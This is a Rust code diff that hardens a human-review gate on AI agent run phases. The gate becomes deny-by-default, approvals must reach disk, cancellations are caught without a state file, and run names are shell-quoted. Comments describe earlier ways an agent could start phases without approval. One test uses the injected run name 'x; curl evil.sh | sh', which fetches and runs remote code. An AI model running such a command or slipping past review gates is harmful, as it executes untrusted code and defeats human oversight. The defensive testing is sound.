@@ -53,6 +53,8 @@ use tiny_http::{Header, Method, Request, Response, Server, StatusCode};
 use crate::flock::FileLock;
 use crate::herdr::Herdr;
 use crate::run::{RunState, data_dir, list_runs_in, runs_dir};
+use crate::run::is_reviewer_phase_name;
+use crate::shell::shell_single_quote;
 
 /// How often [`review_wait`] polls the live server for a reviewer decision.
 /// Mirrors `phase::POLL_INTERVAL` — a filesystem/state poll, not a hot loop.
@@ -1796,9 +1798,26 @@ fn handle_post_submit(mut req: Request, ctx: &Arc<Ctx>, run: &str, p: &RunPaths)
             "annotations": annotations,
         });
         let _ = fs::write(p.feedback(), fb_json.to_string());
-        let _ = fs::write(p.approved(), b"approved\n");
-        rs.state = LoopState::Approved;
-        let _ = rs.save(&p.review_state());
+        // These two writes were advisory — "so a human poking at the run dir can
+        // see the outcome" — while the server's own state was the authority. They
+        // are load-bearing now: `gate_status` reads them first and `phase_start`
+        // turns the answer into a refusal, so a marker that never reached disk is
+        // an approval the run cannot act on. Report the failure instead of
+        // answering 200 to a reviewer whose decision is not durable.
+        if let Err(e) = fs::write(p.approved(), b"approved\n").and_then(|()| {
+            rs.state = LoopState::Approved;
+            rs.save(&p.review_state())
+        }) {
+            eprintln!("drovr review: approval for '{run}' did not reach disk: {e}");
+            drop(rs);
+            respond_str(
+                req,
+                500,
+                "application/json",
+                format!(r#"{{"ok":false,"error":"approval not durable: {e}"}}"#),
+            );
+            return;
+        }
         drop(rs);
         respond_str(
             req,
@@ -2527,7 +2546,30 @@ pub enum WaitOutcome {
     /// the driver should tear the run down, not revise the spec.
     Cancelled,
     /// No reviewer action within the timeout; the caller may re-run to resume.
+    ///
+    /// [`gate_status`] reuses this for "no decision yet" — the same meaning
+    /// ("re-run to resume") reached without waiting. Two producers, one variant,
+    /// deliberately: a second enum is how the two tables start to disagree.
     Timeout,
+}
+
+impl WaitOutcome {
+    /// The process exit code for this outcome.
+    ///
+    /// **On the type because the invariant is.** Both `review wait` and `review
+    /// status` promise one table a caller learns once; while the mapping was
+    /// hand-written in each command's match arm, the only thing keeping them
+    /// equal was that they had been copy-pasted, and a later edit to one would
+    /// have silently restored the two-tables-that-drift failure forge#57 is
+    /// about. `one_outcome_table_lives_on_the_type` pins the values.
+    pub fn exit_code(self) -> i32 {
+        match self {
+            WaitOutcome::Approved => 0,
+            WaitOutcome::Timeout => 2,
+            WaitOutcome::ChangesRequested => 3,
+            WaitOutcome::Cancelled => 5,
+        }
+    }
 }
 
 /// Resolve the spec gate's outcome from the run dir alone — **no server**.
@@ -2582,24 +2624,92 @@ pub fn gate_status(run: &str) -> io::Result<WaitOutcome> {
     Ok(match ReviewState::load(&p.review_state()).state {
         LoopState::Cancelled => WaitOutcome::Cancelled,
         LoopState::Approved => WaitOutcome::Approved,
-        // `Waiting` alone is not a decision: it is also where a run sits before
-        // the agent has posted anything. The reviewer's turn is what makes it
-        // one, and `feedback.json` is that turn.
-        LoopState::Waiting if p.feedback().exists() => WaitOutcome::ChangesRequested,
+        // `Waiting` has exactly one writer — the request-changes branch of
+        // `handle_post_submit`, which writes `feedback.json` immediately before
+        // it — so the state alone IS the reviewer's turn. An earlier version also
+        // required `feedback.json` to exist, which read as belt-and-braces and
+        // was really a drift: `review_wait` maps `waiting` to ChangesRequested
+        // unconditionally, so the two surfaces could answer 2 and 3 about one
+        // run, which is the "two tables" failure this whole change is against.
+        LoopState::Waiting => WaitOutcome::ChangesRequested,
         _ => WaitOutcome::Timeout,
     })
 }
 
-/// Is `phase_name` one the spec gate stands in front of?
+/// Does the spec gate stand in front of `phase_name`?
 ///
-/// `plan` and `implement-task-<N>` are the phases `drovr:pipeline` places AFTER
-/// approval — its own exit-0 row reads "proceed to plan". `brainstorm` is
-/// excluded because it *writes* the spec being judged, and gating it would
-/// deadlock the run: no spec, therefore no approval, therefore no spec. Review
-/// panel phases are the panel, not the pipeline, and are excluded for the same
-/// reason they are kept out of `RunState::phases`.
+/// **Deny by default.** `phase_start` appends any name it is handed, so this
+/// namespace is open-ended and an allowlist over it is a gate with a hole for
+/// every name nobody thought of. It had one immediately: `cmd_new` seeds every
+/// run with `brainstorm, plan, implement, review`, so a phase named exactly
+/// `implement` — the one `drovr list` advertises as the next outstanding phase —
+/// sat outside an allowlist of `plan` and `implement-task-<N>`.
+///
+/// Only two kinds are exempt, and both would otherwise deadlock or misfire:
+///
+/// * `brainstorm` **writes** the spec the gate judges. Gate it and there is no
+///   spec, therefore no approval, therefore no spec.
+/// * reviewer phases are the panel, not the pipeline — the same reason they are
+///   kept out of `RunState::phases`. Asked via [`is_reviewer_phase_name`] so this
+///   and the launch path cannot disagree about the shape.
+///
+/// `review` is exempt as the pipeline's own post-implementation phase. Everything
+/// else — including a name [`phase_kind`](crate::brief::phase_kind) cannot
+/// classify at all — is gated, because a phase nobody anticipated is exactly the
+/// one whose safety nobody has reasoned about.
 fn is_gated_phase(phase_name: &str) -> bool {
-    phase_name == "plan" || phase_name.starts_with("implement-task-")
+    if is_reviewer_phase_name(phase_name) {
+        return false;
+    }
+    !matches!(
+        crate::brief::phase_kind(phase_name),
+        Some(crate::brief::PhaseKind::Brainstorm) | Some(crate::brief::PhaseKind::Review)
+    )
+}
+
+/// Why a gated phase may not start. `None` from [`gate_refusal`] means "allow".
+///
+/// A typed decision rather than a rendered sentence: `phase_start` and the HTTP
+/// rehydrate path need to tell "cancelled — tear the run down" from "undecided —
+/// go wait", and the tests need to assert on the decision rather than substring-
+/// match English that a reword would silently change. Same reasoning as
+/// `NotRehydratable` and `NotReapable`, which this repo already settled.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum GateRefusal {
+    /// The reviewer abandoned the run. Terminal — the driver tears it down.
+    Cancelled,
+    /// The reviewer asked for changes; `feedback.json` holds the turn.
+    ChangesRequested,
+    /// The gate is open and nobody has decided yet.
+    Undecided,
+}
+
+impl GateRefusal {
+    /// The sentence a human or a driver reads. Every interpolation that lands
+    /// inside a suggested command is shell-quoted: `validate_label` permits
+    /// spaces, `;`, `|` and `$(…)` in a run name, and the reader of this message
+    /// is an agent that copies suggested commands into a shell.
+    pub fn message(self, run: &str, phase_name: &str) -> String {
+        let q = shell_single_quote(run);
+        let phase = shell_single_quote(phase_name);
+        match self {
+            GateRefusal::Cancelled => format!(
+                "run {q} was CANCELLED by the reviewer — stop work and tear the run down \
+                 (`drovr cleanup {q}`); {phase} will not start"
+            ),
+            GateRefusal::ChangesRequested => format!(
+                "the spec for run {q} is not approved: the reviewer requested changes \
+                 (see feedback.json). Revise the spec, re-post `drovr review summary {q} \
+                 \"<what changed>\"`, and wait again before starting {phase}"
+            ),
+            GateRefusal::Undecided => format!(
+                "the spec for run {q} is not approved: the reviewer has not decided yet. \
+                 Wait on the gate (`drovr review wait {q}`) before starting {phase}. \
+                 If a wait told you otherwise, check it with `drovr review status {q}` — a \
+                 piped wait reports the pipe's exit code, not the gate's"
+            ),
+        }
+    }
 }
 
 /// The refusal a gated phase must clear before it may start, or `None` to allow.
@@ -2607,45 +2717,43 @@ fn is_gated_phase(phase_name: &str) -> bool {
 /// This is the enforced half of the forge#57 fix. [`gate_status`] hands a driver
 /// a channel that a pipe cannot destroy, but it is still a channel someone has
 /// to *choose* to read — and the driver that hit #57 was following instructions
-/// it believed it had satisfied. So the check also lives at the chokepoint, where
-/// no belief is required: `phase start` asks the disk before it spawns anything.
+/// it believed it had satisfied. So the check also lives at the chokepoints,
+/// where no belief is required: the launch paths ask the disk before they spawn.
 ///
-/// # It fires narrowly, on purpose
+/// # What counts as "this run has a gate"
 ///
-/// Only when the run actually opened a spec gate — `review.state.json` exists —
-/// and that gate is not approved. A run that never entered review has no gate to
-/// be un-approved by, and refusing it would break flows that have always been
-/// legitimate. That compatibility case has its own test, and it is the one worth
-/// breaking the build over.
+/// A **cancellation is answered from the marker alone**, with no state file
+/// required — the same predicate `run_is_cancelled` uses for `drovr ask`, and for
+/// the same reason. `handle_post_submit` writes the `cancelled` marker and then
+/// discards the `review.state.json` write error, so a run really can hold a
+/// cancellation and no state file; keying off the state file let exactly that run
+/// start the phases the cancellation exists to stop.
 ///
-/// An unreadable gate allows rather than refuses: `phase start` does its own
-/// loading and reports its own errors, and this function inventing a refusal out
-/// of an I/O failure would blame the gate for something else's fault.
-pub fn gate_refusal(run: &str, phase_name: &str) -> Option<String> {
+/// For every other outcome the gate must have been *opened* — `review.state.json`
+/// exists — or there is nothing to be un-approved by, and refusing would break
+/// runs that never entered review at all. That compatibility case has its own
+/// test, and it is the one worth breaking the build over.
+///
+/// An unreadable run allows rather than refuses: the launch path does its own
+/// loading and reports its own errors, and inventing a refusal out of someone
+/// else's I/O failure would blame the gate for it. Note this is a narrow door —
+/// [`gate_status`] only errors when the run dir is not a directory, in which case
+/// the launch is going to fail on its own a moment later.
+pub fn gate_refusal(run: &str, phase_name: &str) -> Option<GateRefusal> {
     if !is_gated_phase(phase_name) {
         return None;
     }
-    let p = RunPaths::new(crate::run::run_dir(run));
-    if !p.review_state().exists() {
-        return None;
-    }
-    match gate_status(run) {
-        Ok(WaitOutcome::Approved) | Err(_) => None,
-        Ok(WaitOutcome::Cancelled) => Some(format!(
-            "run '{run}' was CANCELLED by the reviewer — stop work and tear the run down \
-             (`drovr cleanup {run}`); '{phase_name}' will not start"
-        )),
-        Ok(WaitOutcome::ChangesRequested) => Some(format!(
-            "the spec for run '{run}' is not approved: the reviewer requested changes \
-             (see feedback.json). Revise the spec, re-post `drovr review summary`, and wait \
-             again before starting '{phase_name}'"
-        )),
-        Ok(WaitOutcome::Timeout) => Some(format!(
-            "the spec for run '{run}' is not approved: the reviewer has not decided yet. \
-             Wait on the gate (`drovr review wait {run}`) before starting '{phase_name}'. \
-             If a wait told you otherwise, check it with `drovr review status {run}` — a \
-             piped wait reports the pipe's exit code, not the gate's"
-        )),
+    let outcome = gate_status(run).ok()?;
+    let gate_was_opened = RunPaths::new(crate::run::run_dir(run))
+        .review_state()
+        .exists();
+    match outcome {
+        // Marker alone, deliberately: see "What counts as a gate" above.
+        WaitOutcome::Cancelled => Some(GateRefusal::Cancelled),
+        WaitOutcome::Approved => None,
+        WaitOutcome::ChangesRequested => Some(GateRefusal::ChangesRequested),
+        WaitOutcome::Timeout if gate_was_opened => Some(GateRefusal::Undecided),
+        WaitOutcome::Timeout => None,
     }
 }
 
@@ -5400,10 +5508,9 @@ mod tests {
         let dir = make_run(&runs_root, "g-undecided", b"# Spec");
         fs::write(dir.join("review.state.json"), br#"{"state":"ready","turn":0}"#).unwrap();
 
-        let refusal = gate_refusal("g-undecided", "plan").expect("plan must be refused");
-        assert!(
-            refusal.contains("not approved"),
-            "the refusal must say WHY, got: {refusal}"
+        assert_eq!(
+            gate_refusal("g-undecided", "plan"),
+            Some(GateRefusal::Undecided)
         );
     }
 
@@ -5415,12 +5522,127 @@ mod tests {
         fs::write(dir.join("review.state.json"), br#"{"state":"cancelled","turn":1}"#).unwrap();
         fs::write(dir.join("cancelled"), b"cancelled\n").unwrap();
 
-        let refusal =
-            gate_refusal("g-cancelled", "implement-task-3").expect("implement must be refused");
-        assert!(
-            refusal.contains("CANCELLED"),
-            "a cancellation must be named as one, not folded into 'not approved': {refusal}"
+        assert_eq!(
+            gate_refusal("g-cancelled", "implement-task-3"),
+            Some(GateRefusal::Cancelled)
         );
+    }
+
+    /// Review finding: `gate_refusal`'s "does this run have a gate?" predicate was
+    /// `review.state.json` exists, checked BEFORE the markers — inverting the
+    /// precedence [`gate_status`] documents, where a marker outranks the state
+    /// file precisely because it is one atomic create and the state file is a
+    /// read-modify-write.
+    ///
+    /// The reachable path is not exotic: the reviewer cancels before the agent's
+    /// first `review summary`, `handle_post_submit` writes the `cancelled` marker
+    /// and then discards the state-file write error, so no `review.state.json` is
+    /// ever created. The run made `drovr ask` and `drovr review status` exit 5
+    /// while `phase start … implement-task-1` proceeded.
+    #[test]
+    fn a_cancelled_run_is_refused_even_with_no_state_file() {
+        let env = TestEnv::new();
+        let runs_root = env.data_root().join("drovr/runs");
+        let dir = make_run(&runs_root, "g-marker-only", b"# Spec");
+        fs::write(dir.join("cancelled"), b"cancelled\n").unwrap();
+        assert!(
+            !dir.join("review.state.json").exists(),
+            "the fixture is only meaningful without the state file"
+        );
+
+        assert_eq!(
+            gate_refusal("g-marker-only", "implement-task-1"),
+            Some(GateRefusal::Cancelled)
+        );
+    }
+
+    /// Review finding: the gate was an ALLOWLIST (`plan` and `implement-task-`)
+    /// over a namespace `phase_start` lets callers extend at will, so everything
+    /// it did not enumerate was allowed by construction.
+    ///
+    /// The miss that matters is not hypothetical: `cmd_new` seeds every run with
+    /// `brainstorm, plan, implement, review`, so a phase named exactly `implement`
+    /// exists from `drovr new` onward and is what `drovr list` advertises as the
+    /// next outstanding phase — and it was not gated. A security-shaped check
+    /// fails closed, so the predicate is now "gate everything except the phases
+    /// that would deadlock the run or belong to the panel".
+    #[test]
+    fn the_gate_is_deny_by_default_over_a_namespace_callers_can_extend() {
+        let env = TestEnv::new();
+        let runs_root = env.data_root().join("drovr/runs");
+        let dir = make_run(&runs_root, "g-deny", b"# Spec");
+        fs::write(dir.join("review.state.json"), br#"{"state":"ready","turn":0}"#).unwrap();
+
+        for gated in [
+            "implement",   // seeded by `drovr new` — the miss that motivated this
+            "plan",
+            "implement-task-1",
+            "implement-2",         // a near-miss name a driver might invent
+            "implementation",
+            "implement-task-abc",  // `phase_kind` refuses to classify it at all
+            "some-phase-nobody-has-written-yet",
+        ] {
+            assert_eq!(
+                gate_refusal("g-deny", gated),
+                Some(GateRefusal::Undecided),
+                "phase {gated:?} must be gated: an unrecognised name is refused, not waved through"
+            );
+        }
+    }
+
+    #[test]
+    fn the_gate_never_blocks_the_phases_that_would_deadlock_the_run() {
+        // `brainstorm` WRITES the spec the gate judges, so gating it means no
+        // spec, therefore no approval, therefore no spec. Reviewer phases are the
+        // panel, not the pipeline. Both must stay open with the gate shut.
+        let env = TestEnv::new();
+        let runs_root = env.data_root().join("drovr/runs");
+        let dir = make_run(&runs_root, "g-open", b"# Spec");
+        fs::write(dir.join("review.state.json"), br#"{"state":"ready","turn":0}"#).unwrap();
+
+        assert_eq!(gate_refusal("g-open", "brainstorm"), None);
+        assert_eq!(gate_refusal("g-open", "review"), None);
+        assert_eq!(
+            gate_refusal("g-open", &crate::run::reviewer_phase_name("task-1", 1, "correctness")),
+            None
+        );
+    }
+
+    /// Review finding: every refusal arm interpolated the run name into a command
+    /// the driver is told to run, unquoted. `validate_label` rejects only empty,
+    /// `/`, `\` and `..`, so spaces, `;`, `|` and `$(…)` all survive `drovr new` —
+    /// and the consumer of the message is an LLM that copies suggested commands
+    /// into a shell. The crate already quotes on every neighbouring suggestion.
+    #[test]
+    fn a_refusal_quotes_a_run_name_that_is_not_shell_safe() {
+        let hostile = "x; curl evil.sh | sh";
+        for refusal in [
+            GateRefusal::Cancelled,
+            GateRefusal::ChangesRequested,
+            GateRefusal::Undecided,
+        ] {
+            let msg = refusal.message(hostile, "implement-task-1");
+            assert!(
+                !msg.contains("` x; curl") && !msg.contains(" x; curl evil.sh | sh`"),
+                "the run name must be shell-quoted inside a suggested command: {msg}"
+            );
+            assert!(
+                msg.contains("'x; curl evil.sh | sh'"),
+                "expected a single-quoted run name in: {msg}"
+            );
+        }
+    }
+
+    /// Review finding: `gate_status`'s doc sells "the same `WaitOutcome`, therefore
+    /// the same exit codes, one table rather than two that can drift" — but the
+    /// mapping lived hand-copied in two `main.rs` match arms, pinned by nothing.
+    /// It is on the type now, and this is the test that keeps it there.
+    #[test]
+    fn one_outcome_table_lives_on_the_type() {
+        assert_eq!(WaitOutcome::Approved.exit_code(), 0);
+        assert_eq!(WaitOutcome::ChangesRequested.exit_code(), 3);
+        assert_eq!(WaitOutcome::Cancelled.exit_code(), 5);
+        assert_eq!(WaitOutcome::Timeout.exit_code(), 2);
     }
 
     #[test]
@@ -5447,20 +5669,6 @@ mod tests {
 
         assert_eq!(gate_refusal("g-approved", "plan"), None);
         assert_eq!(gate_refusal("g-approved", "implement-task-7"), None);
-    }
-
-    #[test]
-    fn the_gate_never_blocks_the_phases_that_precede_it() {
-        // `brainstorm` is what PRODUCES the spec the gate judges, and `review`
-        // phases are the panel, not the pipeline. Gating either would deadlock the
-        // run: the spec could never be written, so it could never be approved.
-        let env = TestEnv::new();
-        let runs_root = env.data_root().join("drovr/runs");
-        let dir = make_run(&runs_root, "g-pre", b"# Spec");
-        fs::write(dir.join("review.state.json"), br#"{"state":"ready","turn":0}"#).unwrap();
-
-        assert_eq!(gate_refusal("g-pre", "brainstorm"), None);
-        assert_eq!(gate_refusal("g-pre", "review"), None);
     }
 
     #[test]
